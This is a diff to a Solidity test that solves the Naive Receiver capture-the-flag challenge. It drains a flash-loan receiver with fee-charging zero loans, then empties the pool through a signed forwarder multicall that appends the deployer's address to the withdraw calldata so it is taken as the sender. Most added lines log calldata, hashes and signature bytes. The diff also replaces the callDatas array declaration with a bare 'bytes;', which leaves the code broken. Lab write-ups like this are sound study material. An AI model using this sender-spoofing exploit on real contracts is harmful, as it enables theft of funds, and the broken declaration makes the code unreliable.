@@ -79,7 +79,7 @@ contract NaiveReceiverChallenge is Test {
     function test_naiveReceiver() public checkSolvedByPlayer {
 
         // NOTE: Create bytes memory called CallDatas that takes 11 arguments
-        bytes[] memory callDatas = new bytes[](11);
+        bytes;
         
         // NOTE: Create batch of callDatas transactions with 9 flahloan and 1 withdraw
         for(uint i=0; i<10; i++){
@@ -87,6 +87,18 @@ contract NaiveReceiverChallenge is Test {
                 NaiveReceiverPool.flashLoan, 
                 (receiver, address(weth), 0, "0x")
             );
+
+            // LOG: show basic info for each flashLoan entry
+            console.log("callDatas[%s] length (bytes):", i, callDatas[i].length);
+
+            // print first 32 bytes (contains selector + part of first arg)
+            bytes32 firstWord;
+            assembly { firstWord := mload(add(callDatas[i], 32)) } // load the first 32-byte word of data
+            console.logBytes32(firstWord);
+
+            // print full calldata as bytes (if not too long)
+            console.log("callDatas[%s] full bytes:", i);
+            console.logBytes(callDatas[i]);
         }
 
         // NOTE: encodeCall = proper calldata 
@@ -99,9 +111,47 @@ contract NaiveReceiverChallenge is Test {
                 (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
             bytes32(uint256(uint160(deployer))) // smuggle payload
         );
+
+        // LOG: inspect the 11th entry (the one with smuggled payload)
+        console.log("=== inspect callDatas[10] (withdraw + smuggled deployer) ===");
+        console.log("callDatas[10] length (bytes):", callDatas[10].length);
+
+        // first 32 bytes contains selector (first 4 bytes) + padding; show it
+        bytes32 firstWord10;
+        assembly { firstWord10 := mload(add(callDatas[10], 32)) }
+        console.log("first 32 bytes (callDatas[10]):");
+        console.logBytes32(firstWord10);
+
+        // show full callDatas[10]
+        console.log("callDatas[10] full bytes:");
+        console.logBytes(callDatas[10]);
+
+        // show the last 32-byte word (this should be the smuggled deployer)
+        uint len10 = callDatas[10].length;
+        bytes32 lastWord10;
+        assembly {
+            lastWord10 := mload(add(add(callDatas[10], 32), sub(len10, 32)))
+        }
+        console.log("last 32 bytes (should be deployer as bytes32):");
+        console.logBytes32(lastWord10);
         
+        // NOTE: builds callData that encodes multicall invocation for the pool contract
         bytes memory callData; 
         callData = abi.encodeCall(pool.multicall, callDatas);
+
+        // LOG: inspect the multicall encoded bytes
+        console.log("=== multicall callData ===");
+        console.log("callData length (bytes):", callData.length);
+
+        // show first 32 bytes of multicall (selector + head)
+        bytes32 multicallFirst;
+        assembly { multicallFirst := mload(add(callData, 32)) }
+        console.log("multicall first 32 bytes (selector + head):");
+        console.logBytes32(multicallFirst);
+
+        console.log("multicall full bytes (truncated if long):");
+        console.logBytes(callData);
+
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
             address(pool),
@@ -111,19 +161,62 @@ contract NaiveReceiverChallenge is Test {
             callData,
             1 days
         );
+
+        // NOTE: 
         bytes32 requestHash = keccak256(
             abi.encodePacked(
-                "\x19\x01",
+                "\x19\x01", // the fixed prefix defined by EIP-191/EIP-712 used 
+                //             before hashing domain & struct hash. It prevents certain 
+                //             signature replay or ambiguity.
                 forwarder.domainSeparator(),
                 forwarder.getDataHash(request)
             )
         );
+
+        // LOG: show Request fields and hashes
+        console.log("=== Forwarder Request struct fields ===");
+        console.log("from (player):");
+        console.logAddress(request.from);
+        console.log("to (pool):");
+        console.logAddress(request.to);
+        console.log("value:");
+        console.logUint(uint256(request.value));
+        console.log("gas:");
+        console.logUint(request.gas);
+        console.log("nonce:");
+        console.logUint(request.nonce);
+        console.log("validUntil (seconds):");
+        console.logUint(request.validUntil);
+        console.log("request.data length:");
+        console.logUint(request.data.length);
+
+        bytes32 dataHash = forwarder.getDataHash(request);
+        console.log("forwarder.getDataHash(request) (bytes32):");
+        console.logBytes32(dataHash);
+
+        bytes32 domainSep = forwarder.domainSeparator();
+        console.log("forwarder.domainSeparator() (bytes32):");
+        console.logBytes32(domainSep);
+
+        console.log("requestHash (digest to sign):");
+        console.logBytes32(requestHash);
+
         (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
         bytes memory signature = abi.encodePacked(r, s, v);
 
-        forwarder.execute(request, signature);
-    }
+        console.log("signature r:");
+        console.logBytes32(r);
+        console.log("signature s:");
+        console.logBytes32(s);
+        console.log("signature v:");
+        console.logUint(v);
+        console.log("signature full bytes:");
+        console.logBytes(signature);
 
+        forwarder.execute(request, signature);
+
+        console.log("forwarder.execute completed.");
+    }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
